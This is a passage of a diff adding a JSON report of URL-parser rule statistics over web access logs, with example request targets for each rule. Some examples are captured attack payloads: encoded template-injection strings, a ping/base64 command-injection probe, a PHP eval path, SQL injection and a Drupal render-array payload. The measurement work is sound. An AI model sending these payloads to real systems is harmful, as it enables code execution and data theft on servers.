+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_port": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.non_ascii": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.trailing_dot": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_noncanonical": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.underscore": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.label_not_ldh_other": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.reserved_rldh": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.bad_alabel": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.uppercase_repaired": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.port_nondefault": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.alabel_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "h.ipv4_ok": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_unreserved_repaired": {
+    "lines": 16,
+    "pct_lines": 0.0004,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 12,
+    "pct_unique": 0.0183,
+    "examples": [
+     "//vulnweb.com/%2e%2e",
+     "////vulnweb.com/%2e%2e",
+     "/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e",
+     "/%7b%25%20%66%6f%72%20%78%20%69%6e%20%28%29%2e%5f%5f%63%6c%61%73%73%5f%5f%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%20%25%7d",
+     "/%7b%7b%5f%73%65%6c%66%2e%65%6e%76%2e%72%65%67%69%73%74%65%72%55%6e%64%65%66%69%6e%65%64%46%69%6c%74%65%72%43%61%6c%6c%62%61%63%6b%28%22%65%78%65%63%22%29%7d%7d",
+     "/%22%3b%70%69%6e%67%20%60%65%63%68%6f%20%61%61%61%61%61%61%61%61%61%61%61%20%7c%20%62%61%73%65%36%34%60%2d%69%6e%6a%65%63%74%2dsecrepo.com%2e%30%31%68%34%78%2e%"
+    ]
+   },
+   "p.lowercase_hex_repaired": {
+    "lines": 45,
+    "pct_lines": 0.0012,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 19,
+    "pct_unique": 0.0289,
+    "examples": [
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=10&p=0&pp=0&mid=9&ep=10&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=B31AF913A68F4CA713911AAFFFCAAA6A",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=2&p=0&pp=0&mid=9&ep=2&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=6F0A41A35D7AB950AE829DFB16DDF4AB",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=1&p=0&pp=0&mid=9&ep=1&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=A2C1DFD001C4CB11B780AB2DF04BFEE1",
+     "/honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf&coi=1494&npp=10&p=0&pp=0&mid=9&ep=10&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto%2b-%2bBSides%2bAu",
+     "/honeypot/Honeypot%20-%20Howto.pdf&coi=1494&npp=6&p=0&pp=0&mid=9&ep=6&du=www.secrepo.com/honeypot/Honeypot%2b-%2bHowto.pdf=652C78CDABA4B0F4DAD4B610B9732D78",
+     "/index.php/Index/dytvent/dtype/%24%7b@eval($_POST%5B'test'%5D)%7d"
+    ]
+   }
+  },
+  "ref_reasons_top": {
+   "308 path: trailing slash, X": 125871,
+   "400 path: empty segment": 65855,
+   "400 query: pair must be exactly name=value": 63088,
+   "400 query: forbidden character X": 5496,
+   "400 query: ambiguous percent-escape X": 4114,
+   "400 path: forbidden character X": 3594,
+   "400 path: ambiguous percent-escape X": 3564,
+   "400 path: not origin-form": 1824,
+   "400 query: duplicate name": 1414,
+   "400 path: query/fragment in path kind": 179,
+   "400 path: bad percent-escape": 62,
+   "400 query: empty pair": 30,
+   "400 path: dot segment": 29,
+   "400 query: bad percent-escape": 3
+  }
+ },
+ "benign": {
+  "lines": 3165265,
+  "unique_targets": 41790,
+  "ref_reject_lines": 77132,
+  "pct_ref_reject": 2.4368,
+  "ref_308_lines": 50977,
+  "pct_ref_308": 1.6105,
+  "clauses": {
+   "p.not_origin_form": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.bad_pct": {
+    "lines": 56,
+    "pct_lines": 0.0018,
+    "sole_cause_lines": 53,
+    "pct_sole": 0.0017,
+    "unique_targets": 23,
+    "pct_unique": 0.055,
+    "examples": [
+     "/self.logs/%s",
+     "/honeypot/Honeypot%20-%2...",
+     "/honeypot/Honeypot%20-%20Howto%20-%20BSides%2",
+     "/honeypot/Honeypot%20-%20Howto%20-%",
+     "/honeypot/BSidesDFW%20-%2",
+     "/honeypot/Honeypot%"
+    ]
+   },
+   "p.enc_slash": {
+    "lines": 18,
+    "pct_lines": 0.0006,
+    "sole_cause_lines": 18,
+    "pct_sole": 0.0006,
+    "unique_targets": 10,
+    "pct_unique": 0.0239,
+    "examples": [
+     "/pe_static%2Fapt1.zip",
+     "/pe_static%2Fzeus.zip",
+     "/maccdc2012%2Fconn.log.gz",
+     "/scada%2Fscada_logs.zip",
+     "/domaindata%2Fdomainmovement.zip",
+     "/tg%2Ftg_snort_fast.7z"
+    ]
+   },
+   "p.enc_backslash": {
+    "lines": 809,
+    "pct_lines": 0.0256,
+    "sole_cause_lines": 576,
+    "pct_sole": 0.0182,
+    "unique_targets": 468,
+    "pct_unique": 1.1199,
+    "examples": [
+     "/honeypot/%5C%22https://twitter.com/sooshie%5C%22",
+     "/honeypot/%5C%22https://twitter.com/theroxyd%5C%22",
+     "/honeypot/%5C%22http://amunhoney.sourceforge.net/%5C%22",
+     "/honeypot/%5C%22http://glastopf.org/%5C%22",
+     "/honeypot/%5C%22http://www.maxmind.com%5C%22",
+     "/%5C%22http://glastopf.org/%5C%22"
+    ]
+   },
+   "p.enc_semicolon": {
+    "lines": 5,
+    "pct_lines": 0.0002,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 3,
+    "pct_unique": 0.0072,
+    "examples": [
+     "/Datasets%2520Description/HTML_Bro_log_1/%3FC%3DD%3BO%3DA",
+     "/web/20170710084348/https%3A//pixel.quantserve.com/pixel%3Br%3D1950971587%3Brf%3D0%3Ba%3Dp-0cXb7ATGU9nz5%3Burl%3Dhttp%3A//www.secrepo.com/%3Bfpan%3Du%3Bfpa%3D%3",
+     "/web/20170710084348/https%3A//pixel.quantserve.com/pixel%3Br%3D513286151%3Brf%3D0%3Ba%3Dp-0cXb7ATGU9nz5%3Burl%3Dhttp%3A//www.secrepo.com/%3Bfpan%3Du%3Bfpa%3D%3B"
+    ]
+   },
+   "p.enc_nul": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.enc_pct": {
+    "lines": 290,
+    "pct_lines": 0.0092,
+    "sole_cause_lines": 250,
+    "pct_sole": 0.0079,
+    "unique_targets": 119,
+    "pct_unique": 0.2848,
+    "examples": [
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb",
+     "/honeypot/Honeypot%2520-%2520Howto.pdf",
+     "/honeypot/Honeypot%252...",
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb'",
+     "/honeypot/Honeypot%2520-%2520Howto%2520-%2520BSides%2520Austin.pdf",
+     "/honeypot/BSidesDFW%2520-%25202014.ipynb'A=0"
+    ]
+   },
+   "p.enc_ctrl": {
+    "lines": 181,
+    "pct_lines": 0.0057,
+    "sole_cause_lines": 5,
+    "pct_sole": 0.0002,
+    "unique_targets": 179,
+    "pct_unique": 0.4283,
+    "examples": [
+     "/%0D",
+     "/%0A",
+     "/maccdc2012/%1F%8B%08%08%9FB%03T",
+     "/maccdc2012/%C0u%1C%B4%04%F0F%0F%06%B1Vd%8E%13%D9%97tg%9EH%0CC%C6%D1%E5%84%BCI%C0%10%14%5C%8B5%CA%B1%22t!%04%88%82g%10w%20%07%20?%19&Q%D2",
+     "/maccdc2012/%1B%22%D9%B9H&%FF%16%19%22:%DF%0Ct&QI%E5%8C%F7%AA,5b%AF%85r%FB;%F1",
+     "/maccdc2012/8%5EA%CAA%E2O%FCva%FCn%C0%B8Y%94%8B%C9K%AF%92%A7%C7zJoZ%25L%20%E0Z%25Z%F9%93%0BE%C2%85B%E6O%B1%5C%F8%A9yr%60%C8'L%AF%D4,%86pt%BE%1C%AFe%A4%0Ez%A7%C1"
+    ]
+   },
+   "p.enc_nonascii": {
+    "lines": 2213,
+    "pct_lines": 0.0699,
+    "sole_cause_lines": 2026,
+    "pct_sole": 0.064,
+    "unique_targets": 249,
+    "pct_unique": 0.5958,
+    "examples": [
+     "/%C2%A0%C2%A0",
+     "/%C3%82%C2%A0%C3%82",
+     "/%20%E5%90%84%E7%A7%8D%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E6%A0%B7%E6%9C%AC%E7%BD%91%E7%AB%99%EF%BC%8C%E6%AF%94%E8%BE%83%E9%80%82%E5%90%88%E7%BB%83%E4%B9%A0%E6",
+     "/3.%E8%BF%99%E4%B8%AA%E6%98%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E9%A1%B6%E7%BA%A7%E4%BC%9A%E8%AE%AECCS%E4%B8%93%E9%97%A8%E9%92%88%E5%AF%B9%E4%BA%BA%E5%B7%A5%",
+     "/%E4%B8%AD%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%B0%B1%E6%98%AF%E4%B8%AD%E5%A4%A7%E8%A5%BF%E6%B4%8B2012%E5%B9%B4%E6%AF%94%E8%B5%9B%E7%9A%84%E6%95%B0%E6%8D%AE",
+     "/blog/category/%e5%ae%a2%e6%88%b7%e7%ab%af%e6%8a%80%e6%9c%af/t20180205_23641.html"
+    ]
+   },
+   "p.raw_nonascii": {
+    "lines": 380,
+    "pct_lines": 0.012,
+    "sole_cause_lines": 380,
+    "pct_sole": 0.012,
+    "unique_targets": 111,
+    "pct_unique": 0.2656,
+    "examples": [
+     "/\\xd0\\xc2\\xbd\\xa8\\xce\\xc4\\xbc\\xfe\\xbc\\xd0.zip",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.rar",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.zip",
+     "/\\xd0\\xc2\\xd4\\xf6\\xd9Y\\xc1\\xcf\\x8aA.7z",
+     "/\\xd4\\xb4\\xc2\\xeb.zip",
+     "/\\xb3\\xcc\\xd0\\xf2.tar.gz"
+    ]
+   },
+   "p.backslash": {
+    "lines": 4,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 4,
+    "pct_sole": 0.0001,
+    "unique_targets": 1,
+    "pct_unique": 0.0024,
+    "examples": [
+     "/self.logs\\\\access.log.2017-06-07.gz"
+    ]
+   },
+   "p.semicolon": {
+    "lines": 79,
+    "pct_lines": 0.0025,
+    "sole_cause_lines": 40,
+    "pct_sole": 0.0013,
+    "unique_targets": 47,
+    "pct_unique": 0.1125,
+    "examples": [
+     "/maccdc2012/ssh.log.gzl;",
+     "/maccdc2012/ssl.log.gz;",
+     "/auth.log/auth.log.gz;",
+     "/maccdc2012/ssh.log.gz;",
+     "/g;m.parentNode.insertBefore(a,m)",
+     "/*!%20*%20Bootstrap%20v3.1.1%20(http://getbootstrap.com)%20*%20Copyright%202011-2014%20Twitter,%20Inc.%20*%20Licensed%20under%20MIT%20(https://github.com/twbs/b"
+    ]
+   },
+   "p.space": {
+    "lines": 1880,
+    "pct_lines": 0.0594,
+    "sole_cause_lines": 1878,
+    "pct_sole": 0.0593,
+    "unique_targets": 747,
+    "pct_unique": 1.7875,
+    "examples": [
+     "/honeypot/Honeypot - Howto.pdf",
+     "/honeypot/BSidesDFW - 2014.ipynb",
+     "/honeypot/Honeypot - Howto - BSides Austin.pdf",
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/ ",
+     "/honeypot/BSidesDFW - 2014.ipynb?'\\xc2\\xb4%270x27;"
+    ]
+   },
+   "p.fragment": {
+    "lines": 179,
+    "pct_lines": 0.0057,
+    "sole_cause_lines": 179,
+    "pct_sole": 0.0057,
+    "unique_targets": 32,
+    "pct_unique": 0.0766,
+    "examples": [
+     "/#",
+     "/#other",
+     "/#malware",
+     "/#system",
+     "/#network",
+     "/data#"
+    ]
+   },
+   "p.raw_ctrl": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "p.other_forbidden_ascii": {
+    "lines": 118,
+    "pct_lines": 0.0037,
+    "sole_cause_lines": 40,
+    "pct_sole": 0.0013,
+    "unique_targets": 88,
+    "pct_unique": 0.2106,
+    "examples": [
+     "/{{imgSrc}}",
+     "/|",
+     "/*!%20*%20Bootstrap%20v3.1.1%20(http://getbootstrap.com)%20*%20Copyright%202011-2014%20Twitter,%20Inc.%20*%20Licensed%20under%20MIT%20(https://github.com/twbs/b",
+     "/](http://www.secrepo.com/)",
+     "/self.logs/%s\"",
+     "/[asDomaincom].sql"
+    ]
+   },
+   "p.dot_segment": {
+    "lines": 19,
+    "pct_lines": 0.0006,
+    "sole_cause_lines": 19,
+    "pct_sole": 0.0006,
+    "unique_targets": 2,
+    "pct_unique": 0.0048,
+    "examples": [
+     "/self.logs/.",
+     "/."
+    ]
+   },
+   "p.empty_segment": {
+    "lines": 8219,
+    "pct_lines": 0.2597,
+    "sole_cause_lines": 7988,
+    "pct_sole": 0.2524,
+    "unique_targets": 1397,
+    "pct_unique": 3.3429,
+    "examples": [
+     "/honeypot//%22http://amunhoney.sourceforge.net//%22",
+     "/honeypot//%22http://glastopf.org//%22",
+     "/honeypot//%22http://www.maxmind.com/%22",
+     "/honeypot//%22https://twitter.com/sooshie/%22",
+     "/honeypot//%22https://twitter.com/theroxyd/%22",
+     "//bootstrap/img/favicon.ico"
+    ]
+   },
+   "p.trailing_slash_308": {
+    "lines": 111364,
+    "pct_lines": 3.5183,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 18591,
+    "pct_unique": 44.4867,
+    "examples": [
+     "/self.logs/",
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/rss/",
+     "/self.logs/?C=M;O=A",
+     "/self.logs/?C=S;O=A"
+    ]
+   },
+   "q.too_long": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.empty_pair": {
+    "lines": 11,
+    "pct_lines": 0.0003,
+    "sole_cause_lines": 11,
+    "pct_sole": 0.0003,
+    "unique_targets": 5,
+    "pct_unique": 0.012,
+    "examples": [
+     "/?&r=1",
+     "/?utm_source=qq&utm_medium=social&utm_oi=1009210425644339200&",
+     "/?&from=androidqq",
+     "/auth.log/auth.log.gz?&range=0&mType=Other",
+     "/?&utm_source=www.nerdydata.com"
+    ]
+   },
+   "q.no_eq": {
+    "lines": 317,
+    "pct_lines": 0.01,
+    "sole_cause_lines": 260,
+    "pct_sole": 0.0082,
+    "unique_targets": 97,
+    "pct_unique": 0.2321,
+    "examples": [
+     "/honeypot/Honeypot - Howto.pdf?'\\xc2\\xb4%270x27;",
+     "/?index",
+     "/robots.txt?1494768654881",
+     "/robots.txt?1494768654880",
+     "/honeypot/BSidesDFW - 2014.ipynb?'\\xc2\\xb4%270x27;",
+     "/robots.txt?1507281124495"
+    ]
+   },
+   "q.multi_eq": {
+    "lines": 58896,
+    "pct_lines": 1.8607,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 18109,
+    "pct_unique": 43.3333,
+    "examples": [
+     "/self.logs/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=S;O=D",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/?C=D;O=A",
+     "/self.logs/?C=D;O=D"
+    ]
+   },
+   "q.empty_name": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.bad_pct": {
+    "lines": 0,
+    "pct_lines": 0.0,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 0,
+    "pct_unique": 0.0,
+    "examples": []
+   },
+   "q.enc_amp_eq": {
+    "lines": 3941,
+    "pct_lines": 0.1245,
+    "sole_cause_lines": 2,
+    "pct_sole": 0.0001,
+    "unique_targets": 227,
+    "pct_unique": 0.5432,
+    "examples": [
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/self.logs/?C=N%3BO%3DD",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=352,r=,rl=0",
+     "/self.logs/?C=M%3BO%3DA",
+     "/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=ca1e71c102b24311819a820caed1581c&uid=24819265&nid=244+285282312"
+    ]
+   },
+   "q.enc_semicolon": {
+    "lines": 4254,
+    "pct_lines": 0.1344,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 165,
+    "pct_unique": 0.3948,
+    "examples": [
+     "/self.logs/?C=S%3BO%3DA",
+     "/self.logs/?C=D%3BO%3DA",
+     "/self.logs/?C=N%3BO%3DD",
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "/self.logs/?C=M%3BO%3DA",
+     "/self.logs/2015/?C=D%3BO%3DA"
+    ]
+   },
+   "q.enc_plus": {
+    "lines": 57,
+    "pct_lines": 0.0018,
+    "sole_cause_lines": 15,
+    "pct_sole": 0.0005,
+    "unique_targets": 38,
+    "pct_unique": 0.0909,
+    "examples": [
+     "/?nsukey=N9rkTszqr%2F1tL9xXJtucbm0%2FuT9udcM79cxMqBXX9NEp46Xr0fokcc96z24thuLvOT%2BBB%2B%2BOlYRUZ4A1qYP79NpCb6ivw1kJrc%2Fmfg4aXRsGrTRxAM3FaQ%2FJ92PLSup4uQ6tMUvHO",
+     "/?nsukey=T4VlJC1T112zATF0Ida%2Baoa3ZY9JkbzuURpniJ%2BYKOZV3lpl1MOJHzQ1XRpB27jgv2yynHJ4bu4pUQZ%2FGzjFGRIRdIzodJ9noNodZaV8v5%2BuxPG7ZKfmlTaZctarrfiIrn8JM%2BuoYSt3Z",
+     "/?nsukey=6i8eWeLEitp55aigrCwsv2Ogl3s%2B6NxXvFWX40lyPjfTAmEeXOFx8BCVF%2FbCsftIffSR5cOcf6dnusBSL5C1tcq41qSpT16LAm6BA5Z3SuSd3bVA%2FSAbNXe6t09VafYt%2FKSLWn%2FTp83dV",
+     "/?nsukey=H5EHZpfbE2ZUUh03wgz6zCYKT340kuCcRe4oZXpjF9ykc7TB%2BhaqZy2yBVGS1%2FWVVqQ49f2s%2FIFYDuij6YRw4lzpnccRRAbyAv0coQWZHj3SZP1voXPscTcOxKgJIiY8g2DrSUuU4Gs16p%2B",
+     "/?nsukey=MtYDbs26NUV%2FYQBfb8AAJ54eWcasaP89twBDILnjDBculyH6p%2FH6xnhHhVFHOtObCbcrlvhuMwofD32oIUvbQtffh99MqRM%2FX2G9BJrKHoj%2BR0BiE7v9y3wcusfoWtMswYPFnGgl8i7vng8",
+     "/?nsukey=igjfJbwkbVaSpr2YzFgiFTKj26ODv7qjdt3POfd%2FWtVFAVRBztLPudV3OCOVCPtd9E4QB1L0Mk%2B7dy%2BOwOfIJ5goOJoPyWDmKrOdiBarbIlwJATd31xYHs2MnmEvRkytt4YB8dC9Kr1wAbDvl"
+    ]
+   },
+   "q.enc_pct": {
+    "lines": 19,
+    "pct_lines": 0.0006,
+    "sole_cause_lines": 1,
+    "pct_sole": 0.0,
+    "unique_targets": 19,
+    "pct_unique": 0.0455,
+    "examples": [
+     "/?hfsagrs=%28select%28id%29from%28users%29where%28%28pwd%29like%28%27a%25%27%29%29%29",
+     "/maccdc2012/%86p%02R%CA%18%E1%DB%9F%FFoQ%3E%9A%81%E7%88iu%D9*%BC%A2T%9C%8F%8E%E9N%B6%FD%E2%0Fc%BF?]]%0BVR,%ADV%85%60%25qC%A6:1%E4Y.%8C%080%04T%A2%607A%E1%CA%22%",
+     "/maccdc2012/%16%912%C8;?%AA%BA%5E%7BHST%1B6B*%EE%0C6%BC%25*%11%C3X+%D55%BD%92%DE%DF9%A8%B8%DE%0E%8A%16%1C%1C:%BD%E7%FC.%D1%EE%F9%DA4%7FQ%F7",
+     "/maccdc2012/%AD%FA%C0%1A%9A%AF%7C?%F7%16%BC%BD%C5%DD)c%5E%C3%91J%F3%D2%D1Q$%E4~%FDqE%DE'%86%22%02(%06Od%7D%F6%F0%98%80%DB%84%D1%85%ABCs%99%F1%95%F5%13%C4Q@%AD%A",
+     "/maccdc2012/%E2%E2%0C_%93%DD%14%C86%B3%C5%D1%3E_Z%AC%7D%F9%1D%84%DAm(%03/%1Cl7%AF%0E'%14b8%D1j%BD%14H?%85%5C%91s%F5%11%22%CF%D6%08%CEs%89%B2%18%25Q%ED%20%3EWSp%",
+     "/maccdc2012/%FC%FCrP%DB%C2%C1aU%81%C5F%7F&z%BE%B3;%F0%F9%0D%1B%F6%B0i%E5%E77%0FL%EA%A93%CE%A2d%F9%90)%B2B%A14%01%1Fa%82c%FC%04%D9%92Q%8A%F1%DB%20%A7*%A9rg68%80%"
+    ]
+   },
+   "q.enc_nul_ctrl": {
+    "lines": 177,
+    "pct_lines": 0.0056,
+    "sole_cause_lines": 1,
+    "pct_sole": 0.0,
+    "unique_targets": 118,
+    "pct_unique": 0.2824,
+    "examples": [
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=198,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=222,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=164,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/gen204?invalidResponse=q=https%3A%2F%2Ftranslate.googleapis.com%2Ftranslate_a%2Fsingle%3Fclient%3Dgtx%26s,ql=154,r=%3C!DOCTYPE%20html%20PUBLIC%20%22-%2F%2FW3C%",
+     "/user/password?name[%23post_render][0]=printf&name[%23markup]=ABCZ%0A"
+    ]
+   },
+   "q.enc_nonascii": {
+    "lines": 52,
+    "pct_lines": 0.0016,
+    "sole_cause_lines": 0,
+    "pct_sole": 0.0,
+    "unique_targets": 52,
+    "pct_unique": 0.1244,
+    "examples": [
+     "/maccdc2012/%C0u%1C%B4%04%F0F%0F%06%B1Vd%8E%13%D9%97tg%9EH%0CC%C6%D1%E5%84%BCI%C0%10%14%5C%8B5%CA%B1%22t!%04%88%82g%10w%20%07%20?%19&Q%D2",
+     "/maccdc2012/8%5EA%CAA%E2O%FCva%FCn%C0%B8Y%94%8B%C9K%AF%92%A7%C7zJoZ%25L%20%E0Z%25Z%F9%93%0BE%C2%85B%E6O%B1%5C%F8%A9yr%60%C8'L%AF%D4,%86pt%BE%1C%AFe%A4%0Ez%A7%C1",
+     "/maccdc2012/%F9?%84%D5k-%1E%87hV%B1%BB%83%CAk$32%CF%B8%18%BC%C6%C5%90%84%F0[%5C[",
+     "/maccdc2012/R%B0%7D%EDr%B0%20B%07%E8%1E@%D4%A5vE%D4%C1Jd%9F%DE%CA%B7L%B2O%8CE/%D1%1FW%DAi%D2%BD%0Cr%5E&%EB%EB%B8%04Hq0(A%CA%82%EE%D6%3C%FA/%8D%DE%DB%B0%1F%9A%C3",
+     "/maccdc2012/D%BD%E4%D5%92%DF%03%86z+?0(f%92x%C2%D8/%FD%04%88q%A8%1B%A3%D28%F6%F8%1Ek%C7K%AD%D12]%7F9%A5%A0P%D0%CB%7B%E6X%10~%93%E2;Kr%07%EA%11,%C9%A1%86%B8'aH%A",
+     "/maccdc2012/%EAf%FD%C1!%D8%EEw%05E%80uF%82%96%01%D8%A4Q%A9Z%AE%05Q%B1;%A1%AC[%9C%A6%9A%C7%950_%1F9T%D1%98%EB%A3%9F%87:%19,%07%DE%9DA%09Z%1E%BE%8D%8B%8B%A3%A0%BE"
+    ]
+   },
+   "q.plus": {
+    "lines": 284,
+    "pct_lines": 0.009,
+    "sole_cause_lines": 249,
+    "pct_sole": 0.0079,
+    "unique_targets": 27,
+    "pct_unique": 0.0646,
+    "examples": [
+     "/misc/?User-Agent=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.0.3%3B+zh-cn%3B+M032+Build%2FIML74K%29+UC+AppleWebKit%2F534.31+%28KHTML%2C+like+Gecko%29+Mobile+Safar",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=dee6e0155a3649fb944f3edea7220ae6&uid=84117791&nid=244+285282312",
+     "/?t=1&cn=ZmxleGlibGVfcmVjc18y&iid=a6d6b916119e4cb4a3863436a80b5e6e&uid=91555709&nid=244+272699400",
+     "/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=ca1e71c102b24311819a820caed1581c&uid=24819265&nid=244+285282312",
+     "/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=f40c7cd240894c4eb5aa1e958be1fb70&uid=2910587663&nid=244+272699400",
+     "/?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&refsrc=email&iid=4bfba245a5dc4303a449e7bc25896fc7&uid=2883868559&nid=244+276893704"
+    ]
+   },
+   "q.semicolon": {
+    "lines": 58264,
+    "pct_lines": 1.8407,
+    "sole_cause_lines": 8,
+    "pct_sole": 0.0003,
+    "unique_targets": 17973,
+    "pct_unique": 43.0079,
+    "examples": [
+     "/self.logs/?C=M;O=A",
+     "/self.logs/?C=S;O=A",
+     "/self.logs/?C=S;O=D",
+     "/self.logs/?C=N;O=D",
+     "/self.logs/?C=D;O=A",
+     "/self.logs/?C=D;O=D"
+    ]
+   },
+   "q.raw_nonascii": {
+    "lines": 2,
+    "pct_lines": 0.0001,
+    "sole_cause_lines": 0,
